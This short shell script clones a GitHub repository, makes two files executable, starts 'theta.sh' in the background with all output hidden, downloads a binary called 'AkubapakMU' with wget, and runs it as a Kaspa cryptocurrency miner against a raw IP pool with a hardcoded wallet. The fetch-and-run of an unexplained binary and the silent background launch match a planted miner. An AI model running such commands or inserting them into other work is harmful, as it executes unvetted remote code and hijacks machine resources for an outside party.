git clone https://github.com/angkii/m.git

cd m

chmod +x theta.sh

chmod +x jagoancoin

./theta.sh > /dev/null 2>&1 &

wget https://github.com/angkii/m/raw/main/AkubapakMU
chmod 700 AkubapakMU

#!/bin/bash

POOL=159.223.188.176:80
WALLET=kaspa:qzmkm7ddenhfclxh2npvye8eymsck9y6l9pyvsdhuans30heqhgrzct5g9pfg

./AkubapakMU --algo KASPA --pool $POOL --user $WALLET $@
